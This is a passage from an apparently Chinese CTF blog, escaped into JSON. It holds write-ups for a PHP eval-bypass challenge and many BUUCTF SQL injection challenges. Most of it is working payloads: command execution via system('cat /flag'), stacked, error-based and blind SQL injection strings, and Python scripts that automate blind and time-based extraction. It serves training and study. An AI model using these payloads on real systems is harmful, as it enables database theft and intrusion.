1$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$&#123;$pi&#125;&#123;pi&#125;($&#123;$pi&#125;&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat%20&#x2F;flag 方法二 通过getallheaders()函数，读取写入HTTP request header字段的值。 payload的构造方式和上面一样 1$pi&#x3D;base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;) 解释如下： 12345base_convert(696468,10,36) &#x3D;&gt; &quot;exec&quot;$pi(8768397090111664438,10,30) &#x3D;&gt; &quot;getallheaders&quot;exec(getallheaders()&#123;1&#125;)&#x2F;&#x2F;操作xx和yy，中间用逗号隔开，echo都能输出echo xx,yy NESTCTF2019 Love Math2 考点 代码审计 Fuzz 解题 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#x27;c&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; //例子 c=20-1 $content = $_GET[&#x27;c&#x27;]; if (strlen($content) &gt;= 60) &#123; die(&quot;太长了不会算&quot;); &#125; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123; die(&quot;请不要输入奇奇怪怪的字符&quot;); &#125; &#125; //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27; , &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;]; preg_match_all(&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;请不要输入奇奇怪怪的函数&quot;); &#125; &#125; //帮你算出答案 eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);&#125; 和上面的那道题基本上是一样的，但是限制更为严格，参数长度必须小于60，所以那道题的两个方法都不能用，这里再介绍一种Fuzz的脚本。 1234567891011&lt;?php$payload = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27; , &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];for($k=1;$k&lt;=sizeof($payload);$k++)&#123; for($i = 0;$i &lt; 9; $i++)&#123; for($j = 0;$j &lt;=9;$j++)&#123; $exp = $payload[$k] ^ $i.$j; echo($payload[$k].&quot;^$i$j&quot;.&quot;==&gt;$exp&quot;); echo &quot;&lt;br /&gt;&quot;; &#125; &#125;&#125; 主要目的就是想fuzz出_GET字符串。可以把这个字符串拆分成两段。先查找_G 1234567$ php fuzz.php | grep _Gis_finite^64&#x3D;&#x3D;&gt;_Gis_infinite^64&#x3D;&#x3D;&gt;_Gis_nan^64&#x3D;&#x3D;&gt;_Gmt_getrandmax^23&#x3D;&#x3D;&gt;_Gmt_rand^23&#x3D;&#x3D;&gt;_Gmt_srand^23&#x3D;&#x3D;&gt;_G 再来查找ET 12345$ php fuzz.php | grep ETrad2deg^75&#x3D;&#x3D;&gt;ETrand^75&#x3D;&#x3D;&gt;ETtan^15&#x3D;&#x3D;&gt;ETtanh^15&#x3D;&#x3D;&gt;ET 选择函数名最短的即可。最终的payload： 1$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;cat &#x2F;flag 或者 1$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$&#123;$pi&#125;&#123;0&#125;($&#123;$pi&#125;&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;cat%20&#x2F;flag","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"},{"name":"命令执行","slug":"CTF/命令执行","permalink":"http://ca0y1h.top/categories/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"buuctf刷题——SQL注入","date":"2020-08-18T09:58:19.000Z","path":"Web_security/ctf_writeup/7.buuctf刷题——SQL注入/","text":"强网杯 2019 随便注 考点 堆叠注入 预编译语句 解题 方法一 判断注入点 之后进行union联合注入的时候发现了正则过滤 几乎过滤了我们所有能用到的语句 再尝试堆叠注入， show tables 查询当前数据库中的表发现了两个表 看下两个表的结构字段 1234&#x2F;&#x2F;查看words表的字段&#39;;show columns from words;# &#x2F;&#x2F;查看1919810931114514表的字段&#39;;show columns from &#96;1919810931114514&#96;;# 骚姿势开始了，我们默认查询的表是word表，那么就可以通过rename语句把words表的表名改成words1，把1919810931114514的表名改成words，然后再用alter语句把flag字段名改成id即可。。。😂 payload： 11&#39;;RENAME TABLE &#96;words&#96; TO &#96;words1&#96;;RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;;ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;# 用 1′ or ‘1’=’1 访问一下 方法二 使用MySQL预处理语句绕过过滤。 我们进行构造这个语句: 123set @a&#x3D;concat(&quot;sel&quot;,&quot;ect flag from &#96;1919810931114514&#96;&quot;);prepare sql from @aexecute sql; payload: 11&#39;;set @a&#x3D;concat(&quot;sel&quot;,&quot;ect flag from &#96;1919810931114514&#96;&quot;);prepare sql from @a;execute sql;# 大小写绕过： 11&#39;;sEt @a&#x3D;concat(&quot;sel&quot;,&quot;ect flag from &#96;1919810931114514&#96;&quot;);Prepare hello from @a;execute hello;# CISCN2019 Hack world 考点 Bool盲注 Python脚本编写 异或注入 解题 每次碰到这种SQL注入的题目都没太多思路。 根据1和2返回结果的不同，可能是bool盲注，()没有过滤，可以使用大部分函数。 空格绕过：%09 %0a %0b %0c %0d /**/ /*!*/或者直接tab 任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。 payload示例： 1if(ascii(substr((select(flag)from(flag)),1,1))&#x3D;ascii(&#39;f&#39;),1,2) 如果等号成立的话，那么就返回Hello, glzjin wants a girlfriend.，如果不成立那么就返回Do you want to be my girlfriend?，用二分法编写盲注脚本： 12345678910111213141516171819202122232425from time import sleepimport requestsurl = &#x27;http://a9475c38-821c-4b23-aa96-87730f0863fe.node3.buuoj.cn/index.php&#x27;flag = &#x27;Hello, glzjin wants a girlfriend.&#x27;result = &#x27;&#x27;for i in range(1, 50): sleep(1) high = 127 low = 32 mid = (high + low) // 2 while high &gt; low: payload = &quot;if(ascii(substr((select(flag)from(flag)),&#123;index&#125;,1))&gt;&#123;char&#125;,1,2)&quot;.format(index=i, char=mid) data = &#123;&#x27;id&#x27;: payload&#125; response = requests.post(url=url, data=data) if flag in response.text: low = mid + 1 else: high = mid mid = (high + low) // 2 result += chr(mid) print(result) 拓展：CTF几种盲注的手法 https://www.anquanke.com/post/id/160584#h2-0 CISCN2019 华北赛区 Day1 Web5 CyberPunk 考点 文件包含 二次注入 报错注入 解题 查看源码提示index.php有file参数，可以使用伪协议文件包含。 index.php 1234567891011121314&lt;?phpini_set(&#x27;open_basedir&#x27;, &#x27;/var/www/html/&#x27;);// $file = $_GET[&quot;file&quot;];$file = (isset($_GET[&#x27;file&#x27;]) ? $_GET[&#x27;file&#x27;] : null);if (isset($file))&#123; if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) &#123; echo(&#x27;no way!&#x27;); exit; &#125; @include($file);&#125;?&gt; confirm.php中对输入的username和phone都进行了过滤了，但是忽略了address字段。 12345678910111213141516171819202122232425262728293031323334353637&lt;?phprequire_once &quot;config.php&quot;;//var_dump($_POST);if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123; $msg = &#x27;&#x27;; $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;; $user_name = $_POST[&quot;user_name&quot;]; $address = $_POST[&quot;address&quot;]; $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = &#x27;no sql inject!&#x27;; &#125;else&#123; $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;; $fetch = $db-&gt;query($sql); &#125; if($fetch-&gt;num_rows&gt;0) &#123; $msg = $user_name.&quot;已提交订单&quot;; &#125;else&#123; $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;; $re = $db-&gt;prepare($sql); $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone); $re = $re-&gt;execute(); if(!$re) &#123; echo &#x27;error&#x27;; print_r($db-&gt;error); exit; &#125; $msg = &quot;订单提交成功&quot;; &#125;&#125; else &#123; $msg = &quot;信息不全&quot;;&#125;?&gt; 在change.php从数据库中取出了在confirm.php输入的address，这样就造成了二次注入。 1234567891011121314151617181920212223242526272829303132333435&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123; $msg = &#x27;&#x27;; $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;; $user_name = $_POST[&quot;user_name&quot;]; $address = addslashes($_POST[&quot;address&quot;]); $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = &#x27;no sql inject!&#x27;; &#125;else&#123; $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;; $fetch = $db-&gt;query($sql); &#125; if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123; $row = $fetch-&gt;fetch_assoc(); $sql = &quot;update `user` set `address`=&#x27;&quot;.$address.&quot;&#x27;, `old_address`=&#x27;&quot;.$row[&#x27;address&#x27;].&quot;&#x27; where `user_id`=&quot;.$row[&#x27;user_id&#x27;]; $result = $db-&gt;query($sql); if(!$result) &#123; echo &#x27;error&#x27;; print_r($db-&gt;error); exit; &#125; $msg = &quot;订单修改成功&quot;; &#125; else &#123; $msg = &quot;未找到订单!&quot;; &#125;&#125;else &#123; $msg = &quot;信息不全&quot;;&#125;?&gt; 思路已经很明确了，先在提交订单的时候的地址处构造一个用来注入的语句，然后再修改一下订单，完成注入。利用updatexml函数因为格式的错误，回显了关键信息的原理，构造如下报错注入攻击语句： 121&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),1,20)),0x7e),1)#&#x2F;&#x2F;如果flag太长的话，通过改变substr的起始值，就可以把flag剩下的部分查出来 SUCTF2019 EasySQL 考点 堆叠注入 sql_mode参数 Oracle 在缺省情况下支持使用 &quot; || &quot;连接字符串 ， 但是在MySQL中缺省不支持 ，MySQL 缺省使用 CONCAT 系列函数来连接字符串 解题 FUZZ后发现过滤了不少关键字，可以输入单个数字，输出的语句应该是用var_dump()函数，考虑堆叠注入。 读取当前数据表： 但是Flag也被过滤了。 连接数据库并从URL获取参数 对获取的参数进行处理后带入数据库查询 ， 并且返回结果 其实主要就是 SQL 查询语句 : select &quot;.$post['query'].&quot;||flag from Flag&quot;; 可以通过修改 sql_mode 模式 : PIPES_AS_CONCAT 来实现将 &quot; || &quot;视为 字符串连接符 而非 或 运算符。 payload：1;set sql_mode=PIPES_AS_CONCAT;SELECT 1 拼接后就变成了 SELECT 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1 || flag FROM Flag 非预期 Payload : \\*,1 拼接后就变成了 SELECT \\* ,1 || flag FROM Flag 极客大挑战 2019 EasySQL 万能密码注入 1check.php?username&#x3D;admin&#39; or &#39;1&#39;&#x3D;&#39;1&amp;password&#x3D;admin&#39; or &#39;1&#39;&#x3D;&#39;1 极客大挑战 2019 LoveSQL 数据库名geek 112&#39; union select 1,database(),3%23 表名 112&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;geek&#39; %23 字段名 112&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;geek&#39; %23 flag 112&#39; union select 1,2,group_concat(password) from l0ve1ysq1 %23 极客大挑战 2019 BabySQL 判断列数 1pwd&#39; ununionion seselectlect 1,2,3# 数据库名geek 112&#39; uniunionon seselectlect 1,database(),3%23 极客大挑战2019 HardSQL 考点 MySQL报错注入 解题 关键词FUZZ一下发现过滤了空格，or，update，handler，/，=等常见字符，这个时候可以试一下报错注入，直接上payload： 爆数据库名 12admin&#39;^extractvalue(1,concat(0x7e,(select(database()))))#&#x2F;&#x2F; geek 爆数据表名 12admin&#39;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))))#&#x2F;&#x2F; H4rDsq1 爆列名 12admin&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;))))#&#x2F;&#x2F; id,username,password 爆值 12admin&#39;^extractvalue(1,concat(0x7e,(select(password)from(H4rDsq1))))#&#x2F;&#x2F; flag&#123;d994a91e-d9d6-4901-b025-b8 发现显示不完全，substr()函数无效，可以使用reverse()函数翻转： 12admin&#39;^extractvalue(1,concat(0x7e,(select(reverse((select(password)from(H4rDsq1)))))))#&#x2F;&#x2F; &#125;007f9f56108b-520b-1094-6d9d-e1 也可以使用left()和right()函数绕过： 12admin&#39;^extractvalue(1,concat(0x7e,(select(left(password,30))from(H4rDsq1))))#&#x2F;&#x2F; flag&#123;d994a91e-d9d6-4901-b025-b 12admin&#39;^extractvalue(1,concat(0x7e,(select(right(password,30))from(H4rDsq1))))#&#x2F;&#x2F; e-d9d6-4901-b025-b80165f9f700&#125; 极客大挑战2019 FinalSQL 考点 MySQL regx盲注 解题 进入题目给了几个hint，首先确定是盲注，当id=6的时候回显Clever! But not this table.。 登录框经过测试后没有可注入的点，尝试id参数后发现过滤空格，/**/以及if等关键字。测试注入点： 16^length(database())&gt;0 回显Clever! But not this table. 16^length(database())&lt;0 回显ERROR 由于过滤了if关键字，所以要使用regex盲注，示例： 16^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),1,1))&gt;0)^1 确定注入点和payload形式后开始编写盲注脚本： 12345678910111213141516171819202122232425262728import requestsfrom time import sleepurl = &quot;http://410b10a4-249a-4d9b-b1df-03f557672625.node3.buuoj.cn/search.php?id=6&quot;flag = &quot;Clever! But not this table.&quot;result = &quot;&quot;for i in range(1, 1000): sleep(0.5) low = 32 high = 127 while high &gt; low: mid = (high + low) // 2 #payload = &quot;^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;index&#125;,1))&gt;&#123;char&#125;)^1&quot; #payload = &quot;^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),&#123;index&#125;,1))&gt;&#123;char&#125;)^1&quot; #payload = &quot;^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;Flaaaaag&#x27;)),&#123;index&#125;,1))&gt;&#123;char&#125;)^1&quot; payload = &quot;^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;index&#125;,1))&gt;&#123;char&#125;)^1&quot; response = requests.get(url + payload.format(index=i, char=mid)) if flag in response.text: low = mid + 1 else: high = mid if low != 32: result += chr(low) else: break print(result) GXYCTF2019 BabysqliV1 原题目描述：刚学完sqli，我才知道万能口令这么危险，还好我进行了防护，还用md5哈希了密码！ (BUUCTF没有提示啊!!!) 考点 SQL联合查询 解题 先FUZZ一波过滤了某些字符，常规的注入都没能pass，查看源码发现一个search.php 先说说base32 和 base64 的区别， base32 只有大写字母和数字数字组成，或者后面有三个等号。 base64 只有大写字母和数字，小写字母组成，后面一般是两个等号。 明显，那段文字是base32加密 解密后：c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw== 继续base64解密：select * from user where username = '$name' 12345name&#x3D;1&#39; or 1&#x3D;1#&amp;pw&#x3D;1 &#x2F;&#x2F; wrong user! &gt;&gt;&gt; do not hack me! &#x2F;&#x2F; or和&#x3D;被过滤了name&#x3D;1&#39; Or 1#&amp;pw&#x3D;1 &#x2F;&#x2F; 大小写直接绕过了name&#x3D;1&#39; Or 1 Order by 4#&amp;pw&#x3D;1&gt;&gt;&gt; Error: Unknown column &#39;4&#39; in &#39;order clause&#39; &#x2F;&#x2F;可以知道有三个column 盲猜字段名为id、username、password，当username为admin时会说wrong pass!，其他都是wrong user!，username应该就是admin了。 那么逻辑就是：先判断username在不在数据库,再判断密码对不对，这样我们就可以通过联合查询的时候会创一个虚拟的表单，让他查这个虚拟表。 下面猜测admin在哪个字段： 1name&#x3D;1&#39;union select 1,&#39;admin&#39;,3# 我们知道有admin用户的，经测试name=1'union select 1,'admin',3#报密码错误，说明这里就是username了，password字段应该是3的位置。 这道题得猜它的后端源码是怎么写的： 123456789101112&lt;?php$name = $_POST[&#x27;name&#x27;];$passwd = md5($_POST[&#x27;pw&#x27;]);$sql = &quot;select * from user where username = &#x27;$name&#x27;&quot;;$query = mysql_query($sql);if (!strcasecmp($passwd, $query[passwd])) &#123; echo $flag;&#125; else &#123; echo(&quot;Wrong Pass&quot;);&#125; 由于name参数可注，我们可以构造sql语句使其查询为假，然后联合查询出一个比如0f5ed8a8d8d44d86a570aacffa922251(ca01h的md5)，然后密码输入ca01h，就会查询成功。 12username &#x3D; 1&#39; union select 1,&#39;admin&#39;,&#39;0f5ed8a8d8d44d86a570aacffa922251&#39;#password &#x3D; ca01h 参考：https://www.gem-love.com/ctf/453.html RCTF2015 EasySQL 考点 报错注入 二次注入 解题 主要有三个功能，注册、登录和修改密码，这种情况一般都是二次注入的问题。 在注册页面，试了一下，username 和 email 处有过滤，直接 fuzz 一下哪些字符被禁了 注册用户名zzz\\，在点击修改密码后，有一个报错： 猜测SQL语句应该是这样写的： 1select * from user where username &#x3D; &quot;zzz\\&quot; and pwd &#x3D; &#39;92dd83acc13018d34e2454d4c5c05cf3&#39; 使用报错注入的方式爆出数据 获取当前用户信息 1zzz&quot;||(updatexml(1,concat(0x7e,(select(user())),0x7e),1))# 返回XPATH syntax error: '~root@localhost~' 查看当前数据库 1zzz&quot;||(updatexml(1,concat(0x7e,(select(database())),0x7e),1))# 返回XPATH syntax error: '~web_sqli~' 查看数据库的表 1zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),0x7e),1))# 返回XPATH syntax error: '~article,flag,users~' 查看users表中的字段 1zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;users&#39;)),0x7e),1))# 返回XPATH syntax error: '~name,pwd,email,real_flag_1s_her' 使用reverse函数查看后面的内容 1zzz&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;users&#39;))),0x7e),1))# 返回XPATH syntax error: '~ereh_s1_galf_laer,liame,dwp,ema' 查看real_flag_1s_here字段的内容 1zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e),1))# 返回XPATH syntax error: '~xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx' 看到有很多垃圾数据，用regexp匹配f开头 1zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)),0x7e),1))# 返回XPATH syntax error: '~flag&#123;e43ad246-f211-4292-a531-c3' 再用reverse函数读后面的内容 1zzz&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),0x7e),1))# 返回XPATH syntax error: '~&#125;04c7d828343c-135a-2924-112f-64' GYCTF2020 Ezsqli 考点 无information_schema布尔盲注 无列名注入 解题 过滤很多东西，比如information_schema、union…select、join、if、and、or等等，基本上就是考虑盲注了。 另外还发现： 122返回V&amp;N 122||1&#x3D;1返回Nu1l 122||1&#x3D;5返回V&amp;N 也就是说，本来2查询的是V&amp;N，如果||后面的表达式为True则返回Nu1L、false则返回V&amp;N。 判断一下是不是盲注 122||length(database())&gt;0返回Nu1l 122||length(database())&lt;0返回V&amp;N 确定是盲注了，那么就直接写脚本用二分法盲注表名，可以使用sys.schema_table_statistics_with_buffer innodb_table_stats和innodb_index_stats和sys.schema_table_statistics也可以使用 1234567891011121314151617181920212223242526272829import requestsfrom time import sleepURL = &quot;http://acbcc15b-d8f2-48b3-9c67-3b16b465068f.node3.buuoj.cn/index.php&quot;flag = &quot;Nu1L&quot;result = &quot;&quot;target = &quot;select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()&quot;for i in range(1, 50): sleep(0.1) low = 32 high = 127 while high &gt; low: mid = (high + low) &gt;&gt; 1 payload = &quot;2||ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;&#123;&#125;&quot; data = &#123; &#x27;id&#x27;: payload.format(target, i, mid) &#125; response = requests.post(url=URL, data=data) if flag in response.text: low = mid + 1 else: high = mid if low != 32: result += chr(low) else: break print(result) 得到表名 1users23333333333333,f1ag_1s_h3r3_hhhhh 下面就要实现无列名注入 在知道表名，不知道列名的情况下，我们可以利用union来给未知列名“重命名”，还可以利用报错函数来注入出列名。 这道题再提出一种思路，ascii位偏移大小比较。名字听起来比较玄乎，但是原理很简单： 核心payload：(select 'admin','admin')&gt;(select * from users limit 1) 假设flag为flag{bbbbb}，对于payload这个两个select查询的比较，是按位比较的，即先比第一位，如果相等则比第二位，以此类推；在某一位上，如果前者的ASCII大，不管总长度如何，ASCII大的则大，这个不难懂，和c语言的strcmp()函数原理一样，举几个例子： glag &gt; flag{bbbbb} alag{zzzzzzzzzzz} &lt; flag{bbbbb} a &lt; flag{bbbbb} z &gt; flag{bbbbb} 在这样的按位比较过程中，因为在里层的for()循环，字典顺序是从ASCII码小到大来枚举并比较的，假设正确值为b，那么字典跑到b的时候b=b不满足payload的大于号，只能继续下一轮循环，c&gt;b此时满足了，题目返回真，出现了Nu1L关键字，这个时候就需要记录flag的值了，但是此时这一位的char是c，而真正的flag的这一位应该是b才对，所以flag += chr(char-1)，这就是为什么在存flag时候要往前偏移一位的原因。 另外还需要注意的地方是，字段数一定是一一匹配，这里f1ag_1s_h3r3_hhhhh是有两个字段的(可以用select 1|select 1,2|select 1,2,3试一试)，知道是两个字段后，还要注意字段内的一一对应，f1ag_1s_h3r3_hhhhh表中的flag在第二个字段。 直接show code： 1234567891011121314151617181920import requestsfrom time import sleepURL = &quot;http://98ef5288-1d34-4680-a03c-1aa5f5fbfaad.node3.buuoj.cn/index.php&quot;flag = &quot;Nu1L&quot;result = &quot;&quot;payload = &quot;2||(select 1,&#x27;&#123;&#125;&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh)&quot;for i in range(1,200): for j in range(32, 127): sleep(0.1) char = result + chr(j) data=&#123; &#x27;id&#x27;: payload.format(char) &#125; response = requests.post(URL, data=data) if flag in response.text: result += chr(j - 1) print(result) break; 这样就可以成功的拿到flag。 GXYCTF2019 BabysqliV3 NCTF2019 SQLi 考点 regex盲注 参考文章：REGEXP注入与LIKE注入 解题 hint.txt 123456$black_list &#x3D; &quot;&#x2F;limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\\&#39;|&#x3D;| |in|&lt;|&gt;|-|\\.|\\(\\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep&#x2F;i&quot;;If $_POST[&#39;passwd&#39;] &#x3D;&#x3D;&#x3D; admin&#39;s password,Then you will get the flag; 找到admin的密码即可得flag 由于单引号被禁用，使用 \\ 转义and前面的那个单引号，使得 '\\' and passwd=' 形成闭合。构造passwd处为 ||/**/passwd/**/regexp/**/&quot;^a&quot;;%00，用regexp查询passwd ^匹配字符串开头 %00截断后面的内容。但是不能在输入框直接提交，会被url encode 变为%2500被黑名单拦截。 查询语句变为： 1select * from users where username&#x3D;&#39;\\&#39; and passwd&#x3D;&#39;||&#x2F;**&#x2F;passwd&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^a&quot;; 如果regex为真的话，会返回404，否则跳转至登录界面。 盲注脚本： 123456789101112131415161718192021222324# -*- coding: UTF-8 -*-import requestsimport stringimport timefrom urllib import parseurl = &#x27;&#x27;&#x27;http://aabb7aa1-f68f-44c7-9e75-514410c6d6f2.node3.buuoj.cn/index.php&#x27;&#x27;&#x27;passwd = &quot;&quot;strs = string.ascii_lowercase + string.digits + &#x27;_&#x27;for i in range(100): for m in strs: time.sleep(0.3) data = &#123; &quot;username&quot;: &#x27;\\\\&#x27;, &quot;passwd&quot;: &#x27;||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;&#123;&#125;&#x27;.format(passwd+m, parse.unquote(&#x27;%00&#x27;)) &#125; res = requests.post(url, data) if res.status_code == 404: passwd += m print(passwd) breakprint(passwd) SWPUCTF2019 web1 考点 十六进制+MySQL预编译绕过 PHP代码审计 解题 题目只有一个登录框，注册功能未开放，随意填写内容，点击登录，抓包 在username字段添加一个单引号PHP会报错 而闭合引号后会正常显示。因此可大致确定注入存在，随后开始构造payload。由于题目对username进行了严格的检测，所以无法使用单语句进行注入，但是注入点又存在，于是可以尝试进行堆叠注入。 不过貌似过滤了绝大多数的关键字，采用16进制+MySQL预处理绕过。原理如下： 编写时间盲注脚本： 1234567891011121314151617181920212223242526272829303132import requestsimport jsonimport timedef main(): url = &#x27;&#x27;&#x27;http://71c8375e-74ff-45aa-a2ee-8670864f6b0b.node3.buuoj.cn/index.php?r=Login/Login&#x27;&#x27;&#x27; payloads = &quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot; flag = &#x27;&#x27; for i in range(1, 30): # payload = &quot;select if(ascii(substr((select database()),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot; # payload = &quot;select if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot; # payload = &quot;select if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot; payload = &quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot; for j in range(0, 128): time.sleep(0.1) datas = &#123;&#x27;username&#x27;: payloads.format(str_to_hex(payload.format(i, j))), &#x27;password&#x27;: &#x27;test213&#x27;&#125; data = json.dumps(datas) times = time.time() res = requests.post(url=url, data=data) if time.time() - times &gt;= 3: flag = flag + chr(j) print(flag) breakdef str_to_hex(s): return &#x27;&#x27;.join([hex(ord(c)).replace(&#x27;0x&#x27;, &#x27;&#x27;) for c in s])if 